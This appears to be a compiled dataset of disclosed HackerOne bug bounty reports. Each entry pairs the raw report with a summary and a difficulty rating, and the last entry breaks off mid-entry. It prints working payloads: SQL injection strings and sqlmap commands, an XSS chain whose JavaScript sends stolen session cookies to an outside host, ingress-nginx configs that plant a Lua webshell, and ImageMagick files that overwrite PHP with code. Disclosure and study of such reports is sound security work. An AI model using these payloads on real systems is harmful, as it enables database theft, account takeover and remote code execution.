Report https://hackerone.com/reports/2312334: Time based SQL injection at████████
================================================================================
RAW DESCRIPTION:

Description:
While doing test on██████, I’ve found that the endpoint at /pubs/index.php is vulnerable with SQL injection vulnerability.
Vulnerable parameters are 'years' and 'authors'
References
Please check screenshots attached.
Impact
Time based SQL injection can lead to the exfiltration of sensitive data from the database.
System Host(s)
███████
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
POC
Make the following POST request to /pubs/index.php
Code 651 Bytes
1POST /pubs/index.php HTTP/1.1
2Host:██████
3User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate, br
7Content-Type: application/x-www-form-urlencoded
8Content-Length: 68
9Origin: https://███████
10Referer: https://███████/pubs/index.php
11Upgrade-Insecure-Requests: 1
12Sec-Fetch-Dest: document
13Sec-Fetch-Mode: navigate
14Sec-Fetch-Site: same-origin
15Sec-Fetch-User: ?1
16Te: trailers
17Connection: close
18
19years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(2*2),0))OR'
Notice that the response time will be 4 seconds.
Code 652 Bytes
1POST /pubs/index.php HTTP/1.1
2Host:█████████
3User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate, br
7Content-Type: application/x-www-form-urlencoded
8Content-Length: 68
9Origin: https://████████
10Referer: https://████/pubs/index.php
11Upgrade-Insecure-Requests: 1
12Sec-Fetch-Dest: document
13Sec-Fetch-Mode: navigate
14Sec-Fetch-Site: same-origin
15Sec-Fetch-User: ?1
16Te: trailers
17Connection: close
18
19years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
Notice that the response time will be 25 seconds.
This can be further exploited manually or using automated tools such as SQLmap to get data from the DB, but I will stop here for this report.
Thanks.
Suggested Mitigation/Remediation Actions



================================================================================
Vulnerability Description:
The endpoint /pubs/index.php is vulnerable to time-based SQL injection via the 'years' and 'authors' parameters. This allows an attacker to exfiltrate sensitive data from the database by manipulating the response time of the server.

Steps to Reproduce:
1. Send a POST request to /pubs/index.php with the 'years' parameter set to a valid year (e.g., 2017) and the 'authors' parameter containing a time-based SQL injection payload like: Hurlburt'XOR(if(now()=sysdate(),sleep(2*2),0))OR'
2. Observe the response time. A delayed response (e.g., 4 seconds for sleep(2*2)) confirms the time-based SQL injection vulnerability.
Exploitation Difficulty:
The vulnerability involves a straightforward injection of a time-delay payload into a parameter, which is a common and well-documented attack vector. The discovery does not require complex interactions or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2737595: SQL Injection
================================================================================
RAW DESCRIPTION:

I discovered a Blind SQL Injection vulnerability in the application, which allows an attacker to manipulate database queries by injecting malicious input into the vulnerable parameter. Unlike regular SQL injection, blind SQL injection does not directly return data but can be exploited through true/false or time-based responses, revealing the structure and content of the database.
References
Impact
Blind SQL injection can be leveraged to extract sensitive information, bypass authentication, or escalate privileges by manipulating the backend SQL queries. Since the injection is blind, an attacker can use time-based, boolean-based, or out-of-band techniques to extract the data.
System Host(s)
██████
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
Run SQLMap: Use the following SQLMap command to test for SQL injection by directly specifying the vulnerable URL and the parameter:
Code 140 Bytes
1sqlmap -u "███████" \
2--technique=BT --level=5 --risk=3 --threads=10 -p 'filter[event]' \
3--dbms='MySQL' --batch --current-db --random-agent
-u: Specifies the target URL.
--technique=BT: Tells SQLMap to use both Boolean-based (B) and Time-based (T) blind SQL injection techniques.
--level=5: Sets the highest level of testing, increasing the depth of testing.
--risk=3: Specifies a higher risk level for potentially dangerous payloads.
--threads=10: Increases the number of concurrent requests, speeding up the process.
-p 'filter[event]': Specifies that the filter[event] parameter is the target for injection.
--dbms='MySQL': Indicates that the target database management system is MySQL.
--batch: Automatically answers all questions (non-interactive mode).
--current-db: Attempts to retrieve the current database name.
--random-agent: Randomizes the User-Agent header to evade detection.
████████
Suggested Mitigation/Remediation Actions



================================================================================
Vulnerability Description:
This is a Blind SQL Injection vulnerability in the application, which allows an attacker to manipulate database queries by injecting malicious input into the vulnerable parameter. Unlike regular SQL injection, blind SQL injection does not directly return data but can be exploited through true/false or time-based responses, revealing the structure and content of the database.

Steps to Reproduce:
1. Run SQLMap with the following command to test for SQL injection by specifying the vulnerable URL and parameter: sqlmap -u "███████" --technique=BT --level=5 --risk=3 --threads=10 -p 'filter[event]' --dbms='MySQL' --batch --current-db --random-agent
2. Analyze the responses to determine if the application is vulnerable to Blind SQL Injection by observing time-based or boolean-based responses.
Exploitation Difficulty:
The vulnerability involves a straightforward use of SQLMap with predefined parameters to detect Blind SQL Injection. The attack does not require understanding complex application states or novel logic, and the interactions between components are well-documented and commonly understood in security testing.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/390879: SQL Injection on www.██████████ on countID parameter
================================================================================
RAW DESCRIPTION:

Description:
Hello Team,
I have came across a sql injection vulnerability on www.██████ on countID parameter. I was able to retrieve the banner which is
Microsoft SQL Server 2008 R2 (SP3) - 10.50.6220.0 (X64&
Mar 19 2015 12:32:14
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows NT 6.3 <X64> (Build 9600: ) (Hypervisor)
after confirming the vulnerability i have stopped testing further.
Vulnerable URL:
https://www.███/public/saveCount.cfm?countID=4
Steps to Reproduce:
python sqlmap.py -u https://www.██████████/public/saveCount.cfm?countID=4 --level=3 --risk=3
POC
█████████
Impact
Attacker can take control over the database server.



================================================================================
Vulnerability Description:
The vulnerability is a SQL injection in the countID parameter of the URL https://www.███/public/saveCount.cfm. This allows an attacker to execute arbitrary SQL queries on the database server, potentially gaining control over it. The server is running Microsoft SQL Server 2008 R2 (SP3).

Steps to Reproduce:
1. Identify the vulnerable URL: https://www.███/public/saveCount.cfm?countID=4
2. Use sqlmap to test for SQL injection: python sqlmap.py -u https://www.██████████/public/saveCount.cfm?countID=4 --level=3 --risk=3
Exploitation Difficulty:
The vulnerability is straightforward to discover using automated tools like sqlmap. It does not involve multiple components, complex application states, or novel logic. The attack is a classic SQL injection, which is a well-known and commonly exploited vulnerability.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/577612: MSSQL injection via param Customwho in https://█████/News/Transcripts/Search/Sort/ and WAF bypass
================================================================================
RAW DESCRIPTION:

Summary:
MSSQL injection via param Customwho in https://███████/News/Transcripts/Search/Sort/
Description:
MSSQL injection via param Customwho in https://██████████/News/Transcripts/Search/Sort/
There is WAF, but we can make bypass and via global variable @@LANGID we can know that the base is used here - MSSQL
Impact
Critical
Step-by-step Reproduction Instructions
Via global variable @@LANGID we can find out that here is MSSQL database. ████
https://█████/News/Transcripts/Search/Sort/?Customwho=31002//|//@@LANGID
And if use a non-existing global variable, then we get an error. ██████
https://██████████/News/Transcripts/Search/Sort/?Customwho=31002//|//@@nonexisting
Suggested Mitigation/Remediation Actions
Using prepared statement
Impact
We can read and do other manipulations in the database. We can also try to make RCE



================================================================================
Vulnerability Description:
The vulnerability is an MSSQL injection via the 'Customwho' parameter in the specified URL, which allows an attacker to execute arbitrary SQL queries. The presence of a WAF can be bypassed, potentially leading to data manipulation or RCE.

Steps to Reproduce:
1. Identify the vulnerable parameter 'Customwho' in the URL: https://█████/News/Transcripts/Search/Sort/
2. Inject a SQL query using the 'Customwho' parameter to test for SQL injection, e.g., https://█████/News/Transcripts/Search/Sort/?Customwho=31002//|//@@LANGID
3. Confirm the database is MSSQL by observing the response to the injected query with @@LANGID
4. Attempt to bypass the WAF by using non-existing global variables or other bypass techniques, e.g., https://██████████/News/Transcripts/Search/Sort/?Customwho=31002//|//@@nonexisting
Exploitation Difficulty:
The attack involves identifying a vulnerable parameter, crafting SQL injection payloads, and bypassing a WAF. While the steps are straightforward, the need to bypass a WAF adds complexity. However, the techniques used (e.g., using @@LANGID) are well-known in the SQL injection context.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/982202: SQLi in login form of █████
================================================================================
RAW DESCRIPTION:

Summary
The following is vulnerable to a sqli, due to a limited char set this is t██████████y to demonstrate and not picked up by sqlmap.
Code 50 Bytes
1POST /██████████.asp HTTP/█████.████
2Host: ███████
Description
Code 777 Bytes
1POST /██████.asp HTTP/████.███
2Host: █████
3Connection: close
4Content-Length: 45
5Cache-Control: max-age=0
6Upgr███████e-Insecure-Requests: ███
7Origin: https://████
8Content-Type: application/x-www-form-urlencoded
9User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X █████████0_████5_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4254.0 Safari/537.36
10Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: navigate
13Sec-Fetch-User: ?████████
14Sec-Fetch-Dest: document
15Referer: https://████████/wireless/index.asp
16Accept-Encoding: gzip, deflate
17Accept-Language: en-US,en;q=0.9
18Cookie: █████████████████
19
20usr='/**/or/**/lastName!='&pwd=██████████
returns a 302 with a login error message, while an invalid column name returns a 500 error message. Note that spaces are not accepted, so I must replace them with /**/.
To summarize:
usr='/**/or/**/lastName!='&pwd=████████ -> 302
usr='/**/or/**/abc!='&pwd=███ -> 500
case error g██████████get (which could be used to exfil data):
usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/(SELECT/**/count(*)/**/FROM/**/accounts)>███0000/**/THEN/**/'a'/**/ELSE/**/███/**/END)/**/and/**/usr!='&pwd=████ -> 302
usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)<██████0000)/**/THEN/**/'a'/**/ELSE/**/████████/**/END)/**/and/**/usr!='&pwd=████████ -> 500
Using this, we can prove that there are 26 user accounts:
usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=500000)/**/THEN/**/'a'/**/ELSE/**/███████/**/END)/**/and/**/usr!='&pwd=████████ -> 302
usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=26)/**/THEN/**/'a'/**/ELSE/**/██████████/**/END)/**/and/**/usr!='&pwd=██████ -> 500
I have not exfiltrated any data with the exception of column names, the table name and the fact that there are 26 user accounts in this service.
if you would like me to, I believe I can escalate this to allow me to login to this service, but I am not doing that without permission
Impact
SQLi, likely escalation to full service compromise



================================================================================
Vulnerability Description:
The login form is vulnerable to blind SQL injection due to improper input sanitization, allowing an attacker to infer database structure and extract information through differential responses (302 vs 500 errors). The attack requires bypassing space character filtering using /**/ comments.

Steps to Reproduce:
1. Send a POST request to the vulnerable login form with a crafted SQLi payload replacing spaces with /**/ to bypass filtering, e.g., usr='/**/or/**/lastName!='&pwd=████████
2. Observe the response codes (302 for valid SQL conditions, 500 for invalid) to infer database structure and perform blind SQLi
Exploitation Difficulty:
While the vulnerability itself is a standard SQLi, the discovery required: 1) identifying the space character filtering, 2) developing a bypass using /**/ syntax, 3) constructing differential queries based on error responses, and 4) interpreting blind SQLi results through HTTP status codes. The need to chain these non-obvious bypass techniques with blind inference methods elevates the complexity.

--------------------------------------------------------------------------------



Cross-site Scripting (XSS) - Reflected Vulnerabilities (1 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1073780: [hta3] Chain of ESI Injection & Reflected XSS leading to Account Takeover on [███]
================================================================================
RAW DESCRIPTION:

Hi,
Summary
There is an ESI injection vulnerability in the https://████████/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults endpoint on the ms parameter. With this injection, we're able to extract session cookies that have the HttpOnly flag by using this payload.
Code 43 Bytes
1<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>
We also found a Reflected XSS vulnerability in the https://████████/portal/pls/portal/PORTAL.wwexp_render.show_tree endpoint on the title parameter
By chaining these 2 bugs together, we're able to steal session cookies and take over a victim user's account.
 
Steps To Reproduce
1- By browsing here https://████████/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults?osf=&ms=lol<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>lol&mo=containsall&pg=&sepg=-1&fi=&fs=&ft=&pu=1&has=&as=17%2C0%3B48%2C0&saa=ALL&po=matchall&pi=&pc=&co=equal&ci=&p_action=SUBMIT&ll=, we're able to see your cookies in the Search field between the lol strings at the beginning and end.
█████████
2- When browsing here, https://█████████/portal/pls/portal/PORTAL.wwexp_render.show_tree?p_otype=SITEMAP&p_request=open&p_minusimage=&p_plusimage=&p_headerimage=%2Fimages%2Fbhfind2.gif&p_show_banner=NO&p_show_cancel=NO&p_open_item=1.FOLDER.FOLDERMAP.1_0&p_open_items=0.SITEMAP.FOLDERMAP.0_-1&p_domain=wwc&p_sub_domain=FOLDERMAP&p_title=Browse+Pages</title><svg/onload=alert(domain)>&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.ft&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fi&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fs&p_datasource_data=nls_sub_domain%3Dtext%2Cnls_name%3Dfolderplpopup, we can see an alert box showing the vulnerable domain caused by this HTML and JavaScript code in the title parameter.
Code 34 Bytes
1</title><svg/onload=alert(domain)>
████████
3- To chain these 2 bugs together, we created the following PoC. This JavaScript code is fetching the URL containing the ESI injection, grabbing the value of the cookies in the response and then sending them over to our server in order to steal them.
Code 702 Bytes
1fetch('https://████████/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults?osf=&ms=lol<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>lol&mo=containsall&pg=&sepg=-1&fi=&fs=&ft=&pu=1&has=&as=17%2C0%3B48%2C0&saa=ALL&po=matchall&pi=&pc=&co=equal&ci=&p_action=SUBMIT&ll=').then(function (response) {
2		return response.text();
3}).then(function (html) {
4
5	var parser = new DOMParser();
6	var doc = parser.parseFromString(html, 'text/html');
7  
8  //var input = doc.querySelector('input')[0];
9  var cookies = doc.getElementById("x61_ms").value;
10  fetch(`https://www.jr0ch17.com/ato?cookies=${cookies}`);
11
12}).catch(function (err) {
13	// There was an error
14	console.warn('Something went wrong.', err);
15});
To trigger this whole PoC, you can browse to this URL. You can replace the server with your own to reproduce it.
Code 634 Bytes
1https://████████/portal/pls/portal/PORTAL.wwexp_render.show_tree?p_otype=SITEMAP&p_request=open&p_minusimage=&p_plusimage=&p_headerimage=%2Fimages%2Fbhfind2.gif&p_show_banner=NO&p_show_cancel=NO&p_open_item=1.FOLDER.FOLDERMAP.1_0&p_open_items=0.SITEMAP.FOLDERMAP.0_-1&p_domain=wwc&p_sub_domain=FOLDERMAP&p_title=Browse+Pages</title><script/src='https://www.jr0ch17.com/hta3.js'></script>&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.ft&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fi&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fs&p_datasource_data=nls_sub_domain%3Dtext%2Cnls_name%3Dfolderplpopup
As you can see, the XSS payload is now the following.
Code 54 Bytes
1</title><script/src='https://www.jr0ch17.com/hta3.js'>
We can then see that we have received the victim's cookies including the session cookie which has the HttpOnly flag.
██████████
 
Impact
By chaining these 2 vulnerabilities together and by tricking a victim user into clicking a link, an attacker is able to steal their session cookies which have the HttpOnly flag and take over their account. With an ESI injection and depending on the configuration, it's also potentially possible to get an SSRF and get access to internal resources. We're still exploring that area of the bug at the moment so we'll provide updates on if we're able to get further with it.
Let me know if you have any questions or require more details.
Thanks,
@jr0ch17



================================================================================
Vulnerability Description:
A chain of ESI Injection and Reflected XSS vulnerabilities allows stealing HTTP-only session cookies, leading to account takeover. The ESI injection leaks sensitive cookies, while the XSS delivers a payload to exfiltrate them.

Steps to Reproduce:
1. Inject ESI payload into the 'ms' parameter of the SearchResults endpoint to extract HTTP-only cookies: `https://████████/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults?ms=lol<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>lol`
2. Exploit Reflected XSS in the 'title' parameter of the show_tree endpoint to execute malicious JavaScript: `https://████████/portal/pls/portal/PORTAL.wwexp_render.show_tree?p_title=Browse+Pages</title><script/src='https://attacker.com/steal.js'>`
3. Chain both vulnerabilities by using the XSS to fetch the ESI-injected cookie data and exfiltrate it to an attacker-controlled server.
Exploitation Difficulty:
This attack requires: (1) identifying two distinct vulnerabilities (ESI injection and XSS), (2) understanding their interaction (cookie extraction via ESI + exfiltration via XSS), and (3) crafting a multi-stage payload. While ESI injection is somewhat specialized, the chaining logic follows common web attack patterns.

--------------------------------------------------------------------------------



Code Injection Vulnerabilities (9 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1122791: [hta3] Remote Code Execution on  https://███ via improper access control to SCORM Zip upload/import
================================================================================
RAW DESCRIPTION:

Summary:
There is a Remote Code Execution vulnerability at https://█████████/Kview/CustomCodeBehind/base/courseware/scorm/management/scorm2004uploadcourse.aspx which allows any user to upload a SCORM course package. Furthermore, an attacker can add an ASPX shell to the SCORM package which will then get extracted onto the server, where the attacker can then execute commands.
Steps To Reproduce:
Visit https://███████/ and log in with the credentials: ██████████
Now download this "malicious" SCORM course package: █████
If you unzip scorm.zip, you will notice this is a valid SCORM package, and you will also notice that I've included an ASPX file in shared/cdlcdlcdl.aspx which runs the whoami command. Notice I also included that file reference in the Scorm Manifest (imsmanifest.xml)
Visit https://████████/Kview/CustomCodeBehind/base/courseware/scorm/management/scorm2004uploadcourse.aspx, select the ██████ file. Start intercepting in Burp Suite Repeater.
Forward the POST request to /Kview/CustomCodeBehind/base/courseware/scorm/management/scorm2004uploadcourse.aspx
Now intercept the request to /Kview/CustomCodeBehind/base/courseware/scorm/management/scorm2004editmetadata.aspx
Right-Click on it, Hover down to "Do intercept" and click "response to this request" then forward it. (In your web-browser you might be able to just right-click, inspect-element, and search for strCourseId in there but my browser was being funky).
Once you've received the response, search for "strCourseId" and grab it.
For example, you would grab F6BAC72B45D64B34ACB662BB001D8523 out of the following response:
Code 783 Bytes
1<a onclick="return&#32;ConfirmBeforeNavigateAway(&#39;Are&#32;you&#32;sure&#32;you&#32;want&#32;to&#32;navigate&#32;away&#32;from&#32;this&#32;page?&#32;\n\nYou&#32;made&#32;changes&#32;that&#32;will&#32;not&#32;be&#32;saved&#32;if&#32;you&#32;continue.&#32;\n\nClick&#32;OK&#32;to&#32;proceed&#32;or&#32;Cancel&#32;to&#32;return&#32;to&#32;the&#32;page.&#39;);" id="ML.BASE.WF.ReuploadCourse" class="WorkflowButton" NavigatingURL="Courseware/SCORM/Management/SCORM2004ReuploadCourse.aspx" ItemId="&lt;IDTable&gt;&lt;strCourseId&gt;F6BAC72B45D64B34ACB662BB001D8523&lt;/strCourseId&gt;&lt;strVersionId&gt;F6BAC72B45D64B34ACB662BB001D8523&lt;/strVersionId&gt;&lt;/IDTable&gt;" href="javascript:__doPostBack(&#39;ML.BASE.WF.ReuploadCourse&#39;,&#39;&#39;)"><span>Course Files</span></a>
Now, visit https://█████/CServer/Courseware/<YOUR_COURSE_ID>/shared/cdlcdlcdl.aspx and you will see the shell executes:
███
Supporting Material/References:
https://█████/CServer/Courseware/F6BAC72B45D64B34ACB662BB001D8523/shared/cdlcdlcdl.aspx
Proof-of-Concept Video
█████████
Impact
Critical, an attacker can execute commands on this military server, steal sensitive information, pivot to internal systems, etc.
Best,
@cdcl



================================================================================
Vulnerability Description:
A Remote Code Execution vulnerability exists due to improper access control in the SCORM course package upload feature. An attacker can upload a malicious SCORM package containing an ASPX shell, which gets extracted and executed on the server.

Steps to Reproduce:
1. Log in to the target system with provided credentials
2. Download and prepare a malicious SCORM package containing an ASPX shell
3. Upload the malicious SCORM package via the vulnerable endpoint
4. Intercept and manipulate the upload process using Burp Suite to obtain the course ID
5. Access the uploaded ASPX shell via the obtained course ID to execute commands
Exploitation Difficulty:
The attack involves multiple steps including preparing a malicious package, intercepting requests, and manipulating the upload process. However, the steps are straightforward once the vulnerability is identified, and the interaction between components is not particularly subtle or complex.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1620702: RCE  on ingress-nginx-controller via Ingress spec.rules.http.paths.path field
================================================================================
RAW DESCRIPTION:

Report Submission Form
Summary:
A user with ingress create/update privilege may inject config into nginx.conf with path.
Config the log_format and access_log to write arbitrary file.
Include the file we created to bypass path sanitizer to RCE.
Kubernetes Version:
Code 236 Bytes
1serverVersion:
2  buildDate: "2022-03-06T21:32:53Z"
3  compiler: gc
4  gitCommit: e6c093d87ea4cbb530a7b2ae91e54c0842d8308a
5  gitTreeState: clean
6  gitVersion: v1.23.4
7  goVersion: go1.17.7
8  major: "1"
9  minor: "23"
10  platform: linux/amd64
Component Version:
Code 359 Bytes
1-------------------------------------------------------------------------------
2NGINX Ingress controller
3  Release:       v1.2.1
4  Build:         08848d69e0c83992c89da18e70ea708752f21d7a
5  Repository:    https://github.com/kubernetes/ingress-nginx
6  nginx version: nginx/1.19.10
7
8-------------------------------------------------------------------------------
Steps To Reproduce:
Create a kind cluster config
lab.yaml
Code 467 Bytes
1kind: Cluster
2name: lab
3apiVersion: kind.x-k8s.io/v1alpha4
4nodes:
5# the control plane node config
6- role: control-plane
7  kubeadmConfigPatches:
8  - |
9    kind: InitConfiguration
10    nodeRegistration:
11      kubeletExtraArgs:
12        node-labels: "ingress-ready=true"
13  extraPortMappings:
14  - containerPort: 80
15    hostPort: 80
16    protocol: TCP
17  - containerPort: 443
18    hostPort: 443
19    protocol: TCP
20# the three workers
21- role: worker
22- role: worker
23- role: worker
Create a testing cluster with the previous config
Code 37 Bytes
1kind create cluster --config lab.yaml
Install nginx-ingress-controller
Code 120 Bytes
1kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/kind/deploy.yaml
Create a the first malicious ingress
This ingress will allow attacker to write arbitrary content to arbitrary file.
(note that the service not-exist-service does not need to exist)
write_ingress.yaml
Code 666 Bytes
1apiVersion: networking.k8s.io/v1
2kind: Ingress
3metadata:
4  name: webexp
5spec:
6  rules:
7    - host: "example.com"
8      http:
9        paths:
10          - path: "/x/ {\n
11            }\n
12          }\n
13          log_format exploit escape=none $http_x_ginoah;\n
14          server {\n
15            server_name x.x;\n
16            listen 80;\n
17            listen [::]:80;\n
18            location /z/ {\n
19                access_log /tmp/luashell exploit;\n
20            }\n
21            location /x/ {\n
22          #"
23            pathType: Exact
24            backend:
25              service:
26                name: not-exist-service
27                port:
28                  number: 8080
Apply the first malicious ingress config
Code 35 Bytes
1kubectl apply -f write_ingress.yaml
Write a malicious lua config to /tmp/luashell
Note that in other cluster config, the localhost may need to change to ingress-controller's ip.
Code 263 Bytes
1curl localhost/z/ -H "host: x.x" -H 'x-ginoah: content_by_lua_block {ngx.req.read_body();local post_args = ngx.req.get_post_args();local cmd = post_args["cmd"];if cmd then f_ret = io.popen(cmd);local ret = f_ret:read("*a");ngx.say(string.format("%s", ret));end;}'
Create a the second malicious ingress
This ingress will include the malicious lua config, which allow attack to execute arbitrary command.
webshell_ingress.yaml
Code 655 Bytes
1apiVersion: networking.k8s.io/v1
2kind: Ingress
3metadata:
4  name: webexp
5spec:
6  rules:
7    - host: "example.com"
8      http:
9        paths:
10          - path: "/x/ {\n
11            }\n
12          }\n
13          log_format exploit escape=none $http_x_ginoah;\n
14          server {\n
15            server_name x.x;\n
16            listen 80;\n
17            listen [::]:80;\n
18            location /z/ {\n
19                include /tmp/luashell;\n
20            }\n
21            location /x/ {\n
22          #"
23            pathType: Exact
24            backend:
25              service:
26                name: not-exist-service
27                port:
28                  number: 8080
Apply the second malicious ingress config
Code 38 Bytes
1kubectl apply -f webshell_ingress.yaml
RCE and get output
Code 44 Bytes
1curl localhost/z/ -H "host: x.x" -d "cmd=id"
Supporting Material/References:
[attachment / reference]
<image_0>
Impact
A cluster user/SA with ingress create/update privilege may Remote Code Execution on ingress-nginx-controller pod
After RCE on ingress-nginx-controller the attacker may
utilize the token to take further action on cluster with ingress's privilege
eavesdrop the traffic, modify other ingress rule
DOS
...



================================================================================
Vulnerability Description:
A user with ingress create/update privileges can inject malicious configurations into nginx.conf via the Ingress spec.rules.http.paths.path field. This allows writing arbitrary files and including them to bypass path sanitization, leading to Remote Code Execution (RCE) on the ingress-nginx-controller pod.

Steps to Reproduce:
1. Create a kind cluster configuration and set up a testing environment with nginx-ingress-controller installed.
2. Apply two malicious ingress configurations sequentially to exploit the vulnerability, first to write arbitrary content to a file, then to include this file for RCE.
Exploitation Difficulty:
The attack involves multiple components (ingress configurations, nginx.conf manipulation, file inclusion) and requires understanding of nginx configuration syntax and Kubernetes ingress behavior. The interaction between writing a file and then including it for RCE is non-obvious and requires precise manipulation of application states.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/182557: links the user may download can be a malicious files
================================================================================
RAW DESCRIPTION:

Hi,
Summary:
This vulnerability is pretty simple and pretty dangerous at the same time
Almost any link the user tries to download it's extension is set according to the file extension in the path
if the path is / then it download's it according to the domain name

Eg:
[1] http://example.com/example.php
if the user downloaded the link the file type would be .php
that's not very dangerous though
[2] http://example.com/example.exe
if the user downloaded the link the file type would be .exe
Okey that's dangerous but it requires a lot of social engineering
[3] http://example.com/
if the user downloaded the link the file type would be .com
this requires less social engineering and it's pretty dangerous
why?
because .com files are executable files which may can do what .exe can do
here's links about .com files
https://en.wikipedia.org/wiki/COM_file
and the difference between .exe and .com
https://blogs.msdn.microsoft.com/oldnewthing/20080324-00/?p=23033
there's a new many domain names which may can create malicious extensions like .com
as example
.com.py
which can create a python file
any website can make his favorable extension in the domain path and when the user downloads it it will be downloaded by the extension
as example http://example.com/example.exe
Products affected:
windows 10 x64 brave latest version
Steps To Reproduce:
there is 3 ways to reproduce
[1]
execute this html
<a href="http://example.com" download>http://example.com</a>
right click on the link > Save Link as... > Save
[2]
go to http://example.com
right click > Save Page as... > Save
[3]
execute this html and directly click the link it will download directly
<a href="http://example.com" download>http://example.com</a>
Note :
The none exist pages can't be downloaded

Any link the users tries to download must be .htm or .html
Supporting Material/References:
RCE_At_Brave_Browser.jpg (F135079)
Thanks!



================================================================================
Vulnerability Description:
The vulnerability allows malicious files to be downloaded by users due to the browser's handling of file extensions based on the URL path or domain name. This can lead to the execution of malicious code if the downloaded file's extension is executable (e.g., .com, .exe).

Steps to Reproduce:
1. Execute HTML with a link to http://example.com and use the 'Save Link as...' option.
2. Visit http://example.com directly and use the 'Save Page as...' option.
3. Execute HTML with a link to http://example.com and click the link to download directly.
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves basic testing of file download behaviors and observing the resulting file extensions. No complex interactions or novel logic is required.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1838674: Remote Code Execution on ownCloud instances with ImageMagick installed
================================================================================
RAW DESCRIPTION:

It is possible to execute code on ownCloud instances which have ImageMagick installed. This is due to the usage of ImageMagick for preview generation for some file types. (anything using OC\Preview\Bitmap)
The prerequisite for exploitation seem to be:
ImageMagick is installed (e.g. as described in the ownCloud documentation)
The attacker knows the file path of a file that they uploaded (e.g. /mnt/data/files/)
The attacker is able to upload files to the system (e.g. by using File Drop Folders or having an account)
To reproduce we have provided the following files:
Dockerfile (F2127559)
Code 79 Bytes
1FROM owncloud/server:10.11
2RUN apt-get update && apt-get install -y imagemagick
exploit.msl (F2127558)
Code 313 Bytes
1<?xml version="1.0" encoding="UTF-8"?>
2<image> 
3  <read filename="/mnt/data/files/admin/files/Photos/Portugal.jpg" />
4  <get width="base-width" height="base-height" />
5  <resize geometry="400x400" />
6  <comment>&lt;?php echo php_uname(); ?&gt;</comment>
7  <write filename="/var/www/owncloud/index.php" />
8</image>
image.rgb (F2127557)
Code 217 Bytes
1<svg width="1000" height="1000" 
2xmlns:xlink="http://www.w3.org/1999/xlink">
3xmlns="http://www.w3.org/2000/svg">       
4<image xlink:href="msl:/mnt/data/files/admin/files/exploit.msl" height="500" width="500"/>
5</svg>
Download these files and then perform the following steps:
Build the docker image
docker build . -t owncloud-imagemagick
docker build . -t owncloud-imagemagick
Start the docker image
docker run --rm --name oc-eval -d -p8080:8080 owncloud-imagemagick:latest
docker run --rm --name oc-eval -d -p8080:8080 owncloud-imagemagick:latest
Open the ownCloud instance at localhost:8080 and login using the username “admin” and the password “admin”.
Upload the file exploit.msl
Upload the file image.rgb
Upload the file exploit.msl
Upload the file image.rgb
Reload the page, at this point you will be served the new rewritten index.php that will also perform the phpinfo() command. (you can change which file should be overwritten and what PHP code will be executed inside exploit.msl)
<image_0>
Impact
Attackers that are able to upload files to a ownCloud instance with ImageMagick installed can execute arbitrary code on the system.



================================================================================
Vulnerability Description:
A remote code execution vulnerability exists in ownCloud instances with ImageMagick installed. Attackers can exploit this by uploading specially crafted files (MSL and SVG) that trigger ImageMagick to overwrite PHP files with malicious code when generating previews.

Steps to Reproduce:
1. Build the docker image with ImageMagick installed: `docker build . -t owncloud-imagemagick`
2. Start the docker container: `docker run --rm --name oc-eval -d -p8080:8080 owncloud-imagemagick:latest`
3. Log in to the ownCloud instance at localhost:8080 using username 'admin' and password 'admin'
4. Upload the files `exploit.msl` and `image.rgb` to the ownCloud instance
5. Reload the page to trigger the exploit, which rewrites `index.php` with arbitrary PHP code
Exploitation Difficulty:
